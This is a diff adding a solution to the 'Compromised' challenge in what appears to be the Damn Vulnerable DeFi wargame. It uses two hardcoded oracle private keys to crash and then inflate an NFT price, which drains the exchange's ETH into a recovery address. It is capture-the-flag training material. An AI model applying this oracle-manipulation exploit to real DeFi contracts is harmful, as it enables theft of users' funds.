@@ -3,6 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
+import {console2} from "forge-std/console2.sol";
 import {VmSafe} from "forge-std/Vm.sol";
 
 import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
@@ -75,7 +76,44 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        bytes32 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        bytes32 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        vm.startBroadcast(uint256(privateKey1));
+        oracle.postPrice("DVNFT", 0 ether);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(uint256(privateKey2));
+        oracle.postPrice("DVNFT", 0 ether);
+        vm.stopBroadcast();
+
+        vm.startPrank(player);
+        exchange.buyOne{value: 0.00001 ether}();
+        //exchange.buyOne{value: 0.00001 ether}();
+        vm.stopPrank();
+
+        console.log("NFT bought by player: ", nft.balanceOf(player));
+
+        vm.startBroadcast(uint256(privateKey1));
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(uint256(privateKey2));
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopBroadcast();
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), 0);
+        exchange.sellOne(0);
+        //nft.approve(address(exchange), 1);
+        //exchange.sellOne(1);
+        console.log("NFT sold by player: ", nft.balanceOf(player));
+        console.log("Exchange balance: ", address(exchange).balance);
+        (bool success, ) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success, "Transfer to recovery failed");
+        console.log("Recovery balance: ", recovery.balance);
         
+        vm.stopPrank();
     }
 
     /**
